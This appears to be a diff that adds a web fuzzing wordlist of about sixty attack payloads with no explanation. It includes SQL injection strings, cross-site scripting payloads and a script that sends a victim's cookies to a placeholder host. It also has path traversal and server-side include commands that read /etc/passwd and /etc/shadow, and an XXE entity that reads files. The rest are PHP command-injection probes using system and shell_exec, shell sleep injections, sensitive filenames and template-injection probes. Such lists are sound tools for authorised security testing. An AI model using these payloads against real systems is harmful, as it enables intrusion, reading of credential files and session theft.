@@ -1,0 +1,61 @@
+0 or 1=1
+1;SELECT%20*
+"' or 1 --'"
+") or ("a"="a
+"><script>"
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+" or 0=0 #
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1--
+" or "a"="a
+" or "x"="x
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+%2A%28%7C%28objectclass%3D%2A%29%29
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert("XSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%20$(sleep%2050)
+%20'sleep%2050'
+%27%20or%201=1
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;&gt;&quot;'%;)(&amp;+
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+'%20or%201=1
+'';!--"<XSS>=&{()}
+' (select top 1
+') or ('a'='a
+') or ('x'='x
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+${system(print(`echo%20QIHVTW`.`echo%20$((76%2B48))`.`echo%20QIHVTW`.`echo%20QIHVTW`)%3BQIHVTW
+${shell_exec(print(`echo%20QQZSXU\necho%20$((69%2B44))\necho%20QQZSXU\necho%20QQZSXU`)%3B%25252523QQZSXU
+${passthru(print(`echo%20CGIUOF`.`echo%20$((1%2B49))`.`echo%20CGIUOF`.`echo%20CGIUOF`)%3B%5C%5CCGIUOFo${proc_open(print(`echo%20ZMUKGP\necho%20$((9%2B61))\necho%20ZMUKGP\necho%20ZMUKGP`)%3B%2525255C%2525255CZMUKGPo
+${popen(print(`echo%20FRWTRM;echo%20$((11%2B41));echo%20FRWTRM;echo%20FRWTRM`)%3B.%2522FRWTRM
+%26%20sleep%200%20%26%26%20str%3D%24%28echo%20EHNNQT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
+echo%20$(rm%20SYCGSY.txt%20>%20SYCGSY.txt)
+java.nio.charset.CoderMalfunctionError
+java.nio.file.attribute.PosixFilePermissions
+java.nio.file.LinkPermission
+java.rmi.ServerError
+org.xml.sax.InputSource
+$context.keys
+.bash_history
+.bashrc
+.history
+.htaccess
+.htpasswd
+.passwd
+42*42
+{42*42}
+{{42*42}}
+{{{42*42}}}
+#{42*42}
+${42*42}
+<%=42*42 %>
+{{=42*42}}
+{^xyzm42}1764{/xyzm42}
+${donotexists|42*42}
+[[${42*42}]]
